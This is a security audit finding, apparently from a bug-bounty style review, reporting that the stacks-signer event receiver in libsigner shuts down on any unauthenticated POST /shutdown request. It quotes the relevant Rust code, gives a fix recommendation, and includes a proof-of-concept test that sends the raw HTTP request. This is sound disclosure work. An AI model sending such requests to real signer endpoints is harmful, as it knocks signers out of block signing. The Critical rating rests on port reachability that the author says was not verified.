## Finding confirmed

### Title
Unauthenticated remote shutdown of the signer's event-receiver HTTP server via `/shutdown` - (File: `libsigner/src/events.rs`)

### Summary
The `SignerEventReceiver`'s HTTP server, which listens for events POSTed from the node (`/stackerdb_chunks`, `/new_burn_block`, `/proposal_response`, `/new_block`, `/shutdown`), accepts a `POST /shutdown` request from *any* client that can open a TCP connection to the endpoint, with zero authentication or sender verification. Any request matching that path immediately sets the stop flag and terminates the event loop.

### Finding Description
In `SignerEventReceiver::next_event` (`libsigner/src/events.rs:443-445`):
```rust
} else if request.url() == "/shutdown" {
    event_receiver.stop_signal.store(true, Ordering::SeqCst);
    Err(EventError::Terminated)
}
```
There is no check of the request source, no secret/token comparison, no verification that the sender is the local node process. The claimed equality/fault — "is the sender of a `/shutdown` request ever checked" — resolves to **no**: the branch is reached purely by matching `request.url()`, with no authentication gate analogous to what protects RPC/StackerDB writes elsewhere in the codebase. Once matched, `stop_signal.store(true, ...)` is set unconditionally and `EventError::Terminated` propagates up through `main_loop` (`libsigner/src/events.rs:296-300`), causing the loop to `break` and the receiver thread to exit permanently — there is no restart logic in this file.

The `SignerStopSignaler::send` (`libsigner/src/events.rs:376-396`), used internally for graceful shutdown, is nothing more than an unauthenticated TCP client crafting this exact HTTP request; any external TCP client can reproduce it byte-for-byte.

### Impact Explanation
Any remote party that can reach the TCP port on which the signer's event-receiver HTTP server is bound can send a single `POST /shutdown` request and permanently kill the signer's event-processing thread. This is a persistent DoS on the stacks-signer process (it stops receiving `stackerdb_chunks`/block-proposal/burn-block events from the node), degrading or halting that signer's participation in block signing — a single crafted HTTP request achieves an unauthenticated DoS, which matches the "remote crash/unauthenticated DoS from few messages" Critical category, contingent on remote reachability of the port (see Likelihood).

### Likelihood Explanation
The event-receiver bind address is a config-controlled endpoint the signer operator sets to receive callbacks from its paired node's event dispatcher. Whether this endpoint is remotely reachable by a third party (vs. bound only to localhost/private network between the node and its own signer) is a deployment/config choice I could not fully verify from the index (the `stacks-signer/src/config.rs` endpoint-binding default was not retrievable in this session due to index limits). If an operator binds this listener to a non-loopback interface (which some deployments do, e.g., signer and node on separate hosts), the port is reachable by any TCP client with no credentials, no signer key, and no StackerDB slot required — attacker cost is a single crafted HTTP POST, fully repeatable. If the endpoint is strictly loopback-only in all supported configurations, this finding would not be remotely exploitable under the stated threat model.

### Recommendation
Require the `/shutdown` (and ideally all POST) requests to present a shared secret or bind the listener to loopback by default, or use a local Unix socket, and reject shutdown requests that don't originate from the node's paired address/credential. At minimum, log and rate-limit unauthenticated shutdown attempts, and consider removing the HTTP-based shutdown mechanism in favor of a local-only IPC signal.

### Proof of Concept
```rust
// libsigner/src/events.rs — reproducible test sketch
use std::net::TcpStream;
use std::io::Write;
use libsigner::events::{SignerEventReceiver, EventReceiver};

#[test]
fn unauthenticated_shutdown() {
    let mut receiver: SignerEventReceiver<SomeMsgType> = SignerEventReceiver::new(false);
    let addr = receiver.bind("127.0.0.1:0".parse().unwrap()).unwrap();

    // Attacker: no secret, no slot key, just a raw TCP client
    let mut stream = TcpStream::connect(addr).unwrap();
    let body = "attacker";
    let req = format!(
        "POST /shutdown HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
        body.len(), body
    );
    stream.write_all(req.as_bytes()).unwrap();

    // Assert the receiver is now stopped despite no credential check
    let err = receiver.next_event();
    assert!(matches!(err, Err(libsigner::EventError::Terminated)));
    assert!(receiver.is_stopped());
}
```
This confirms `next_event` returns `EventError::Terminated` and `is_stopped()` becomes `true` after an arbitrary, unauthenticated TCP client sends `/shutdown`, matching the code at `libsigner/src/events.rs:443-445` and the `main_loop` break at `libsigner/src/events.rs:296-300`. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** libsigner/src/events.rs (L284-312)
```rust
    fn main_loop(&mut self) {
        loop {
            if self.is_stopped() {
                info!("Event receiver stopped");
                break;
            }
            let next_event = match self.next_event() {
                Ok(event) => event,
                Err(EventError::UnrecognizedEvent(..)) => {
                    // got an event that we don't care about (not a problem)
                    continue;
                }
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
                Err(e) => {
                    warn!("Failed to receive next event: {:?}", &e);
                    continue;
                }
            };
            if !self.forward_event(next_event) {
                info!("Failed to forward event");
                break;
            }
        }
        info!("Event receiver main loop exit");
    }
```

**File:** libsigner/src/events.rs (L376-396)
```rust
impl EventStopSignaler for SignerStopSignaler {
    #[cfg_attr(test, mutants::skip)]
    fn send(&mut self) {
        self.stop_signal.store(true, Ordering::SeqCst);
        // wake up the thread so the atomicbool can be checked
        // This makes me sad...but for now...it works.
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
        }
    }
}
```

**File:** libsigner/src/events.rs (L443-445)
```rust
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
```
